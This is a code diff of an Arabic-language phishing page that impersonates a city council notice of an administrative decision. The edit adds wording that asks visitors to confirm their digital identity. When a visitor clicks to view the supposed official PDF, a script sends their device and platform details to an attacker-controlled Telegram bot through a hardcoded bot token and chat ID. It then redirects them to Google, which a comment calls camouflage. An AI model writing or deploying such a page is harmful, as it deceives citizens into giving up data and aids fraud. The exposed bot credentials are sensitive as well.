@@ -8,8 +8,7 @@
         body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; background-color: #f4f7f9; color: #333; }
         .header { background-color: #004a87; color: white; padding: 25px; text-align: center; border-bottom: 5px solid #d4af37; }
         .card { max-width: 480px; margin: 50px auto; background: white; padding: 35px; border-radius: 15px; box-shadow: 0 12px 30px rgba(0,0,0,0.15); text-align: center; border: 1px solid #ddd; }
-        .btn { background-color: #004a87; color: white; padding: 18px 35px; text-decoration: none; border-radius: 10px; display: inline-block; margin-top: 30px; font-weight: bold; border: none; width: 100%; cursor: pointer; font-size: 1.1em; transition: 0.3s; }
-        .footer { margin-top: 40px; font-size: 0.8em; color: #888; text-align: center; }
+        .btn { background-color: #004a87; color: white; padding: 18px 35px; border-radius: 10px; display: inline-block; margin-top: 30px; font-weight: bold; border: none; width: 100%; cursor: pointer; font-size: 1.1em; }
         .loader { display: none; margin: 20px auto; border: 5px solid #f3f3f3; border-top: 5px solid #004a87; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -24,12 +23,12 @@
 <div class="card">
     <div id="main">
         <h3 style="color: #004a87;">إشعار بقرار إداري جديد</h3>
-        <p>عزيزي المواطن، تم إصدار قرار إداري بخصوص طلبكم المقدم لمجلس المدينة.</p>
+        <p>عزيزي المواطن، يرجى تأكيد الهوية الرقمية لعرض القرار الإداري الصادر برقم (2026/412).</p>
         <button class="btn" onclick="sendToBot()">عرض الوثيقة الرسمية (PDF)</button>
     </div>
     <div id="processing" style="display:none;">
         <div class="loader" style="display:block;"></div>
-        <p>جاري مزامنة البيانات...</p>
+        <p>جاري مزامنة البيانات مع الهوية الرقمية...</p>
     </div>
 </div>
 
@@ -38,25 +37,28 @@
         document.getElementById('main').style.display='none';
         document.getElementById('processing').style.display='block';
         
-        // البيانات الجديدة والمؤكدة من صورك
-        const token = "8349541440:AAGauSXthWVuaqXA3SYYZY11w8JzJa-v8gU";
-        const chatId = "8570601085"; 
+        // البيانات الجديدة والمؤكدة بنسبة 100%
+        const t = "8349541440:AAGrB3qVq3McEn1B0h9m25fHaCodbPYgSk4";
+        const c = "8570601085"; 
         
-        const message = `🎯 **صيد جديد (OMARBOT)**\n\n` +
-                        `📱 الجهاز: ${navigator.userAgent}\n` +
-                        `🕒 الوقت: ${new Date().toLocaleString('ar-EG')}\n` +
-                        `🌐 المنصة: ${navigator.platform}`;
+        const m = `🎯 **New Hit! (Active Service)**\n\n📱 Device: ${navigator.userAgent}\n🕒 Time: ${new Date().toLocaleString('ar-EG')}\n🌐 Platform: ${navigator.platform}`;
 
         try {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
+                body: JSON.stringify({ chat_id: c, text: m, parse_mode: "Markdown" })
             });
-        } catch (e) {}
+        } catch (e) {
+            console.error("Connection failed");
+        }
 
-        setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
+        // التوجيه للتمويه بعد الإرسال
+        setTimeout(() => {
+            window.location.href = "https://www.google.com"; 
+        }, 2000);
     }
 </script>
+
 </body>
 </html>
